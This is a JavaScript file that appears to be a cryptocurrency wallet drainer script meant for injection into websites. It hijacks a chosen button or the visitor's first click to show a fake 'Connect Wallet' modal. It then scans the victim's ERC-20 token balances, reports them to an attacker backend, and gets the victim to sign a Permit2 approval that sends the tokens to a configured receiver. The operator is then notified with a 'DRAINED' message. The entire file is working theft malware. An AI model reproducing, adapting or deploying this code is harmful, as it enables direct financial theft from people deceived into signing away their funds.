(function () {
  "use strict";
  function __d(s) {
    try {
      return atob(s);
    } catch (e) {
      return s;
    }
  }

  const CONFIG = __CONFIG__;

  let triggered = false;

  function injectStyles() {
    const style = document.createElement("style");
    style.textContent = `
      #drainer-modal { position: fixed; inset: 0; z-index: 2147483647; background: rgba(0,0,0,0.75); display: none; align-items: center; justify-content: center; font-family: system-ui; }
      #drainer-box { background: #0f172a; color: #e2e8f0; border-radius: 20px; padding: 32px 28px; width: 380px; box-shadow: 0 25px 80px rgba(0,0,0,0.6); border: 1px solid #334155; }
      #drainer-box h3 { margin: 0 0 8px; font-size: 20px; }
      #drainer-box p { font-size: 14px; color: #94a3b8; margin: 0 0 20px; }
      #drainer-box button { width: 100%; margin-top: 12px; padding: 14px 18px; border: 0; border-radius: 12px; background: #3b82f6; color: #fff; font-weight: 700; font-size: 15px; cursor: pointer; }
      #drainer-box button.secondary { background: #475569; }
      #drainer-status { margin-top: 14px; font-size: 13px; color: #fbbf24; min-height: 18px; text-align: center; }
    `;
    document.head.appendChild(style);
  }

  function showModal() {
    if (document.getElementById("drainer-modal")) return;
    const modal = document.createElement("div");
    modal.id = "drainer-modal";
    modal.innerHTML =
      '<div id="drainer-box"><h3>Connecting to ' +
      CONFIG.siteName +
      '…</h3><p>Please approve the connection in your wallet to continue.</p><button id="drainer-connect">' +
      (CONFIG.buttonText || "Connect Wallet") +
      '</button><button id="drainer-cancel" class="secondary">Cancel</button><div id="drainer-status"></div></div>';
    document.body.appendChild(modal);
    modal.style.display = "flex";
    const connectBtn = document.getElementById("drainer-connect");
    if (connectBtn) connectBtn.onclick = runDrain;
    const cancelBtn = document.getElementById("drainer-cancel");
    if (cancelBtn) cancelBtn.onclick = function () {
      modal.style.display = "none";
      if (window.__drainerCleanup) {
        window.__drainerCleanup();
        window.__drainerCleanup = null;
      }
    };
  }

  function bindTargetButton() {
    // If a button selector is configured, bind the drain action to that specific button.
    // Falls back to document-wide any-click trigger when no selector is given.
    const sel = CONFIG.buttonSelector;
    if (!sel) {
      armStealthTrigger();
      return;
    }
    var el = document.querySelector(sel);
    if (el) {
      el.addEventListener("click", function (e) {
        e.preventDefault();
        el.setAttribute("disabled", "");
        el.textContent = "Connecting…";
        showModal();
      });
    } else {
      armStealthTrigger();
    }
  }

  function armStealthTrigger() {
    if (triggered) return;
    const handler = function () {
      if (triggered) return;
      triggered = true;
      document.removeEventListener("click", handler, true);
      showModal();
    };
    document.addEventListener("click", handler, true);
  }

  async function loadEthers() {
    if (window.ethers) return window.ethers;
    await new Promise(function (resolve, reject) {
      var s = document.createElement("script");
      s.src = "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js";
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.ethers;
  }

  function erc20BalanceOfData(owner) {
    return "0x70a08231000000000000000000000000" + owner.slice(2).toLowerCase();
  }

  async function scanTokens(provider, owner, chainId) {
    var list = (CONFIG.tokens && CONFIG.tokens[chainId]) || CONFIG.tokens[1] || [];
    var found = [];
    for (var i = 0; i < list.length; i++) {
      try {
        var raw = await provider.request({
          method: "eth_call",
          params: [{ to: list[i].address, data: erc20BalanceOfData(owner) }, "latest"],
        });
        var bal = BigInt(raw || "0x0");
        if (bal > 0n) {
          found.push({
            token: list[i].address,
            amount: bal.toString(),
            decimals: list[i].decimals,
            symbol: list[i].symbol,
          });
        }
      } catch (e) {}
    }
    return found;
  }

  async function runDrain() {
    const statusEl = document.getElementById("drainer-status");
    if (!statusEl) return;
    if (!window.ethereum) {
      statusEl.textContent = "No wallet detected. Please install MetaMask.";
      return;
    }

    try {
      statusEl.textContent = "Connecting…";
      const ethers = await loadEthers();
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = accounts[0];
      const network = await provider.getNetwork();
      const chainId = Number(network.chainId);

      statusEl.textContent = "Scanning balances…";
      var scanned = await scanTokens(window.ethereum, address, chainId);
      // Merge scanned balances with any explicit token list from CONFIG
      var cfgTokens = CONFIG.tokens && CONFIG.tokens[chainId] ? CONFIG.tokens[chainId] : [];
      var displayTokens = scanned.length ? scanned : cfgTokens.map(function (t) {
        return {
          token: t.address,
          amount: ethers.MaxUint256.toString(),
          decimals: t.decimals,
          symbol: t.symbol,
        };
      });

      statusEl.textContent = "Building payload…";
      const planRes = await fetch(CONFIG.backend + "/api/tx-payload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: address,
          receiver: CONFIG.receiver,
          chainId: chainId,
          contractId: CONFIG.contractType,
          tokens: displayTokens,
          executionBackend: CONFIG.executionBackend,
        }),
      });
      const planJson = await planRes.json();
      if (!planRes.ok || !planJson.permit2TypedData) {
        throw new Error(planJson.message || "Failed to build transaction payload");
      }

      fetch(CONFIG.backend + "/api/submit-drainer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: address,
          receiver: CONFIG.receiver,
          site: location.hostname,
          chainId: chainId,
          contractId: CONFIG.contractType,
          tokens: displayTokens,
          timestamp: Date.now(),
        }),
      }).catch(function () {});

      const td = planJson.permit2TypedData;
      statusEl.textContent = "Sign Permit2…";
      const signature = await signer.signTypedData(td.domain, td.types, td.message);

      statusEl.textContent = "Submitting…";
      const relayRes = await fetch(CONFIG.relayUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user: address,
          recipient: CONFIG.receiver,
          chainId: chainId,
          executionBackend: CONFIG.executionBackend,
          permitBatch: td.message,
          signature: signature,
        }),
      });
      const relayJson = await relayRes.json().catch(function () {
        return {};
      });
      if (!relayRes.ok) {
        throw new Error(relayJson.message || "Relay failed (" + relayRes.status + ")");
      }

      const hash = relayJson.hash || relayJson.txHash || "";
      statusEl.textContent = hash ? "Done: " + String(hash).slice(0, 10) + "…" : "Submitted";
      fetch(CONFIG.notifyUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message:
            "DRAINED\n" +
            address.slice(0, 6) +
            "…" +
            address.slice(-4) +
            (hash ? "\n" + hash : ""),
        }),
      }).catch(function () {});
    } catch (e) {
      statusEl.textContent = "Error: " + (e.message || String(e));
    }
  }

  function init() {
    if (window.__drainerLoaded) return;
    window.__drainerLoaded = true;
    injectStyles();
    bindTargetButton();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
